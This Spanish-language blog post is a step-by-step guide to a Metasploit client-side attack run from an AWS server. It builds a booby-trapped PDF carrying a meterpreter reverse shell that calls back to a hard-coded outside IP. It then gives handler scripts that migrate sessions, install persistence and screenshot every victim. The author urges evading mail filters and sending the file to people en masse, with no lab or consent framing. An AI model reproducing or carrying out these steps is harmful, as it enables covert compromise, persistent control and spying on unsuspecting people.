---
layout: post
title: "metasploit - client side attack"
---

## {{ page.title }}

###### {{ page.date | date_to_string }}

**[![](/assets/img/60.png)](/assets/img/60.png)**

#### Introducción

Entonces, estaba el otro día hablando sobre temas de seguridad y salíeron a mención metasploit y set, dos herramientas que facilitan el trabajo en el area, no conozco a persona interesada por el tema que no lo conozca. Hace algunos años habia estado interesado en mfs, así que pude notar la gran mejoria respecto a aquellos tiempos. Es increible, me siento como un chico de pelicula de policias cuando lo ejecuto.

Después de la charla, me quede con la espinita de que tan fácil sería montar algo usable por un total noob en el tema (me), y nada, al parecer hemos llegado a un punto donde cualquier persona puede montar una plataforma relativamente robusta para lanzar ataques. MMM, bueno, eso es desde hace tiempo, pero ahora, junto ahora (y justo como lo he experimentado) es muy fácil y no se requieren de mucha preparación. Tenemos servicios, como AWS, Linode que también ayudan a superar las limitaciones de las configuraciones NAT y el uptime. En mi opinión es una de las mejoras epocas para involucrarse en la seguridad informática.

Sin más preambulos, dejaré unos apuntes...  daré por sentado que se tiene una cuenta en AWS, es todo lo que realmente necesitaremos...

### Instalación

Lo primero que se tendrá que hacer, será instalar msf en la máquina virtual de AWS, en mi caso, he instalado ubuntu 12.04.., también es buena idea, abrir los puertos, 80, 443 y 22, por defecto solo abrira el 22, así que tendran que configurar el perfil de seguridad. Paquetes básicos

<pre class="sh_sh">
$ sudo apt-get install build-essential libreadline-dev libssl-dev libpq5 libpq-dev \
  libreadline5 libsqlite3-dev libpcap-dev subversion openjdk-7-jre git-core \
  autoconf postgresql pgadmin3 curl zlib1g-dev libxml2-dev libxslt1-dev vncviewer \
  libyaml-dev ruby1.9.3 nmap
</pre>

Gemas necesarias:

<pre class="sh_sh">
$ sudo gem install wirble msgpack sqlite3 pg activerecord nokogiri
</pre>

Metasploit

<pre class="sh_sh">
$ git clone https://github.com/rapid7/metasploit-framework mfs
</pre>

Esto creará una carpeta llamada 'mfs' con el framework dentro, ahora será momento de obtener privilegios de super usuario (para poder poner a escuchar handlers en cualquier puerto):

<pre class="sh_sh">
$ sudo su
# 
</pre>

- [http://www.darkoperator.com/installing-metasploit-in-ubuntu/](http://www.darkoperator.com/installing-metasploit-in-ubuntu/)
- [https://github.com/rapid7/metasploit-framework/wiki/Metasploit-Development-Environment](https://github.com/rapid7/metasploit-framework/wiki/Metasploit-Development-Environment)


### Payload

Una vez instalado, hay que crear un archivo que pueda ser enviado, que explote una vulnerabilidad en el equipo remoto y que nos devuelva el control del mismo, con metasploit es muy fácil:

<pre class="sh_sh">
# cd mfs/
mfs # ./msfconsole
...
msf > use exploit/windows/fileformat/adobe_cooltype_sing
msf exploit(adobe_utilprintf) > set FILENAME ganaste.pdf
FILENAME => ganaste.pdf
msf exploit(adobe_utilprintf) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(adobe_utilprintf) > set LHOST 107.21.182.228
LHOST => 107.21.182.228
msf exploit(adobe_utilprintf) > set LPORT 443 (https)
msf exploit(adobe_utilprintf) > exploit

[*] Handler binding to LHOST 0.0.0.0
[*] Started reverse handler
[*] Creating 'ganaste.pdf' file...
[*] Generated output file /root/ganaste.pdf
[*] Exploit completed, but no session was created.
</pre>

Por defecto, el archivo que genera mfs no será util, gmail, hotmail, yahoo, no permitiran enviarlo, al detectarlo como un archivo malicioso, así que aquí tendrán que usar su imaginación para hacerlo indetectable.., lamentablemente no puedo ayudar con esa parte.., si lo hiciera y alguien más siguiera estos pasos seguramente dentro de poco, el método que utilice dejaría de ser util.., pero adelanto que no es demasiado complicado, solo es cuestión de buscar un poco y mfs ayuda mucho.., un par de horas de pruebas-errores deberian bastarles para encontrar un método que funcione.

- [http://www.offensive-security.com/metasploit-unleashed/Client_Side_Attacks](http://www.offensive-security.com/metasploit-unleashed/Client_Side_Attacks)

### Handler (servidor)

Listo, una vez que tengan un archivo indetectable, pueden enviarlo masivamente o selectivamente a las personas que lo deseen y a pulse de raton, tendran sesiones en cada una de esas computadoras (siempre y cuando hayan sido afectadas por la vulnerabilidad en cuestión). Para poder usar las sesiones más de una vez, es una buena idea migrar la sesión a un proceso más estable (en lugar de adobe, que en la máquina atacada se vera congelado y después mostrará una pantalla en blanco, pantalla que la mayoría de los usuarios cerraran, terminando la conexión) y luego configurarlo para que inicie con el sistema.

<pre class="sh_sh">
# cat /root/migrate_persistence.rc
run post/windows/manage/migrate
run persistence -U -i 5 -p 443 -r 107.21.182.22 //o la ip de la máquina donde tengan mfs
</pre>

<pre class="sh_sh">
# cat /root/autoruncommands.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 443
set LHOST 107.21.182.22
set AutoRunScript multi_console_command -rc /root/migrate_persistence.rc
set ExitOnSession false
exploit -j

-ruby-
  sleep(1)
  print_status("waiting on an incoming session...")
  while (true)
    framework.sessions.each_pair do |sid,s|
    thost = s.session_host

    if s.ext.aliases['stdapi']
      print_status("Screenshotting session #{sid} #{thost}...")
      s.console.run_single("screenshot -p #{thost}_#{sid}.jpg -v false -q 85")
    else
      print_status("session #{sid} #{thost} active, but not yet configurated")
    end
  end
end
-/ruby-
</pre>

<pre class="sh_sh">
# ./msfconsole -r /root/autoruncommands.rc
</pre>

- [http://johnbabio.wordpress.com/tag/autorunscript/](http://johnbabio.wordpress.com/tag/autorunscript/)

Listop, podemos empezar a divertirnos

- [http://www.offensive-security.com/metasploit-unleashed/Metasploit_Meterpreter_Basics](http://www.offensive-security.com/metasploit-unleashed/Metasploit_Meterpreter_Basics)
- [http://www.offensive-security.com/metasploit-unleashed/Windows_Post_Gather_Modules](http://www.offensive-security.com/metasploit-unleashed/Windows_Post_Gather_Modules)
- [http://cyruslab.wordpress.com/2012/03/09/metasploit-post-exploitation-with-meterpreter-2/](http://cyruslab.wordpress.com/2012/03/09/metasploit-post-exploitation-with-meterpreter-2/)
- [http://rajhackingarticles.blogspot.mx/2012/11/best-of-metasploit-meterpreter-script.html](http://rajhackingarticles.blogspot.mx/2012/11/best-of-metasploit-meterpreter-script.html)
